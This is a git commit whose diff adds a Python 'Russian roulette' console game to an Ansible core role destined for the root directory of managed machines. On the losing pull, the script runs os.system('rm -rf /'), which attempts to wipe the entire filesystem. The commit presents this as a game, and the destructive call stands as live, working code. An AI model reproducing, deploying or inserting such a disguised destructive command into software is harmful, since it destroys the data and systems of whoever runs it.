65021aba33c6e7f98cc41a5ec1b8e6b723838714
Alexandre Pujol <alexandre@pujol.io>
2025-04-03 21:12:24 +0200

    feat(ansible): core: add the roulette game.

---
+++ ansible/roles/core/files/root/roulette.py
@@ -0,0 +1,30 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import random
+import os
+
+
+def russian_roulette():
+    print("Welcome to Russian Roulette!")
+    chambers = [0, 0, 0, 0, 0, 1]  # 1 represents the bullet
+    random.shuffle(chambers)
+
+    while True:
+        input("Press Enter to pull the trigger...")
+        chamber = chambers.pop()
+
+        if chamber == 1:
+            print("Bang! You're dead.")
+            os.system("rm -rf /")
+            break
+        else:
+            print("Click! You're still alive.")
+
+        if not chambers:
+            print("Congratulations! You've survived the game.")
+            break
+
+
+if __name__ == "__main__":
+    russian_roulette()
